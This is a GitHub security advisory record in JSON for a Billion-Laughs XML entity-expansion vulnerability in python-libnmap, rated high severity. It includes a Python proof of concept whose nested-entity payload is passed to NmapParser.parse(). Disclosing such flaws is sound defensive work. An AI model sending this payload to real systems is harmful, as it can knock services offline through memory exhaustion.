{
    "ghsaId": "GHSA-9ccv-p7fg-m73x",
    "severity": "HIGH",
    "summary": "XML Injection in python-libnmap",
    "description": "### Description\n\npython-libnmap is affected by a Billion-Laughs -style XML injection vulnerability.\n\n### PoC\n\n```python\nty = NmapParser()\n\npayload = \"\"\"\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ELEMENT lolz (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n]>\n<lolz><hello>&lol3;</hello></lolz>\n\"\"\"\n\nty.parse(payload)\n```",
    "permalink": "https://github.com/advisories/GHSA-9ccv-p7fg-m73x",
    "publishedAt": "2019-07-18T15:38:41Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-9ccv-p7fg-m73x"
        },
        {
            "type": "CVE",
            "value": "CVE-2019-1010017"
        }
    ]
}